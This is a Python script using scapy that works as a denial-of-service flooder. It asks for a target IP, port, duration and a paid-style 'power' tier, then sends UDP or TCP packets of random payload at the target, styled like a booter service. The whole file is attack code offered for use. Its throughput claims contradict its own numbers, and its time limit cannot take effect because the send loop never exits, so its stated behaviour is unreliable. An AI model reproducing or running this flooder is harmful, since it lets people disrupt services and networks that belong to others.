from scapy.all import *
import time

# Función para imprimir la interfaz ASCII
def print_ascii_art():
    ascii_art = """
   _____ _                     _____         _   
  / ____| |                   / ____|       | |  
 | (___ | |_ ___  _ __ ___  | |  __  __ ___| |_ 
  \___ \| __/ _ \| '__/ _ \  | | |_ |/ _/ _ \ __|
  ____) | || (_) | | | (_) | | |__| | |  __/ |_ 
 |_____/ \__\___/|_|  \___/   \_____|  \___|\__|
                                            
    """
    print(ascii_art)

# Imprimir la interfaz ASCII
print_ascii_art()

# Selección del método de ataque
method = input("Choose the attack method (UDP/TCP): ").upper()
if method not in ["UDP", "TCP"]:
    print("Invalid method. Please choose UDP or TCP.")
else:
    # Información de la IP, puerto y duración del ataque
    target_ip = input("Enter the target IP address: ")
    port = int(input("Enter the target port: "))
    attack_duration_input = int(input("Enter the duration of the attack in seconds: "))

    attack_duration = min(attack_duration_input, 700)  # Limitar el tiempo máximo del ataque a 700 segundos

    # Selección de la opción de poder
    print("Select the power option:")
    print("1. VIP (200 Gbps)")
    print("2. Basic (190 Gbps)")
    print("3. Free (176 Gbps)")

    option_power = int(input("Enter your choice:"))

    # Asignar la tasa de envío según la opción de poder seleccionada
    power_limits = {1: 350000000000, 2: 230000000000, 3: 100000000000}
    rate_limit = power_limits.get(option_power, 0)  # Si la opción no está en el diccionario, se asigna 0

    attack_start = time.time()

    while True:
        if time.time() - attack_start >= attack_duration:
            print("Attack finished. Time limit reached.")
            break

        if method == "UDP":
            send(IP(dst=target_ip)/UDP(dport=port)/Raw(RandString(1460)), loop=True, inter=1.0/rate_limit, verbose=0)
        elif method == "TCP":
            send(IP(dst=target_ip)/TCP(dport=port)/Raw(RandString(1460)), loop=True, inter=1.0/rate_limit, verbose=0)

        if rate_limit > 0:
            print(f"Attack sent successfully to {target_ip} on port {port} using {method} protocol at {rate_limit/1000000000} Gbps")
        else:
            print("Invalid power option selected.")

    print("End of the attack.")